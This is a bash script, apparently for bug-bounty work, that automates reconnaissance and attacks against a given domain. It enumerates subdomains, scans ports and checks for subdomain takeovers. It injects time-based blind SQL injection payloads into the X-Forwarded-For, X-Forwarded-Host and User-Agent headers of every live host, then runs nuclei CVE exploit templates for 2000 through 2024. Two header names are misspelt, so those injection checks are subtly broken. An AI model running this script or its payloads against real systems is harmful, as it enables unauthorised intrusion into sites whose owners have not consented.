#!/bin/bash

# Define colors
CYAN='\033[1;36m'
RESET='\033[0m'
GREEN='\033[0;32m'

# Display the logo in light cyan
echo -e "${CYAN}"
echo -e "─█▀▀█ ░█▀▀▀█ █──█ █▀▀▄ █▀▀"
echo -e "░█▄▄█ ─▀▀▀▄▄ █──█ █▀▀▄ ▀▀█"
echo -e "░█─░█ ░█▄▄▄█ ─▀▀▀ ▀▀▀─ ▀▀▀"
echo -e "${RESET}"

# Usage function to display how to use the script
usage() {
    echo "Usage: $0 -d <target_domain>"
    exit 1
}

# Parse the command-line arguments
while getopts ":d:" opt; do
    case "${opt}" in
        d)
            TARGET_DOMAIN=${OPTARG}
            ;;
        *)
            usage
            ;;
    esac
done

# Check if the target domain was provided
if [ -z "${TARGET_DOMAIN}" ]; then
    usage
fi

# Main commands
#Running Subfinder | Htppx | anew
echo -e "${GREEN}Running Subfinder, Httpx and anew...${RESET}"
echo "${TARGET_DOMAIN}" | subfinder -silent | httpx -silent | anew | tee subdomains.txt > /dev/null
echo -e "${CYAN}Task Completed!${RESET}"


# Running naabu
echo -e "${GREEN}Running Naabu...${RESET}"
cat subdomains.txt | naabu --passive -silent > ports.txt
echo -e "${CYAN}Task Completed!${RESET}"


#Running Httpx
echo -e "${GREEN}Running Httpx and getting details...${RESET}"
cat subdomains.txt | httpx -silent -sc -title -cl --tech-detect > httpx-details.txt
echo -e "${CYAN}Task Completed!${RESET}"


# Running Subzy
echo -e "${GREEN}Running Subzy and checking for subdomain takeovers...${RESET}"
subzy run --targets subdomains.txt > subzy.txt
echo -e "${CYAN}Task Completed!${RESET}"

# Running subjack
echo -e "${GREEN}Running Subjack and checking for subdomain takeovers...${RESET}"
subjack -w subdomains.txt > subjack.txt
echo -e "${CYAN}Task Completed!${RESET}"

# Running SQLi X-Forwarded-For
echo -e "${GREEN}Running SQLi attack using X-Forwarded-For...${RESET}"
cat subdomains.txt | httpx -silent -H "X-Forwraded-For:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > SQLi-X-Forwarded-For.txt
echo -e "${CYAN}Task Completed!${RESET}"

# Running SQLi X-Forwarded-Host
echo -e "${GREEN}Running SQLi attack using X-Forwarded-Host...${RESET}"
cat subdomains.txt | httpx -silent -H "X-Forwraded-Hostr:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > SQLi-X-Forwarded-Host.txt
echo -e "${CYAN}Task Completed!${RESET}"

# Running SQLi X-Forwarded-Host
echo -e "${GREEN}Running SQLi attack using User-Agent...${RESET}"
cat subdomains.txt | httpx -silent -H "User-Agent:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > SQLi-User-Agent.txt
echo -e "${CYAN}Task Completed!${RESET}"


echo -e "${GREEN}Creating nuclei directory...${RESET}"
mkdir nuclei
echo -e "${CYAN}Task Completed!${RESET}"

# Running Nuclei for subdomain takeovers
echo -e "${GREEN}Running Nuclei for possible subdomain takeovers...${RESET}"
cat subdomains.txt | nuclei -silent -t /home/bugbounty450/nuclei-templates/http/takeovers/*.yaml > nuclei/nuclei-subover.txt
echo -e "${CYAN}Task Completed!${RESET}"

# Loop through the years 2000 to 2024 for CVE templates
for year in {2000..2024}; do
    echo -e "${GREEN}Running Nuclei template for year $year...${RESET}"
    cat subdomains.txt | uro | nuclei -silent -rate-limit 200 -t /home/bugbounty450/nuclei-templates/http/cves/$year/*.yaml > nuclei/nuclei-$year.txt
done

echo -e "${GREEN}Process complete! Check the output files for results.${RESET}"
